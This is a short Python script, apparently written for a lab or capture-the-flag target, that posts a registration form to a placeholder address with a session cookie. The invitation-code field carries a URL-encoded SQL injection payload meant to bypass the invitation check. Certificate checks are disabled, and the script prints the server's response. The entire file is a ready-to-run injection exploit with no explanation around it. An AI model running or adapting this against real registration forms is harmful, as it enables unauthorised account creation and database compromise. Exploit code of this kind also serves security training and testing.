import requests

# Inputs:
url = 'https://<ip>'
cookie = {'PHPSESSID': '<cookie>'}

# URL encoded payloads
data = (
	"usernameInput=uname"
	"&passwordInput=Passwd%2333"
	"&repeatPasswordInput=Passwd%2333"
	"&invitationCodeInput=%20or%20''%3d" 
)

# POST request
r = requests.post(
	url=url,
	headers={"Content-Type": "application/x-www-form-urlencoded"},
	data=data,
	cookies=cookie,
	verify=False, # Ignore SSL Cert
	allow_redirects=False
)

# Responce
print('\n***** Response *****')
print(f'Status Code: {r.status_code} {r.reason}')
for k, v in r.headers.items():
	print(f'{k}: {v}')
print(f'Response-Length: {len(r.content):,}\n') 
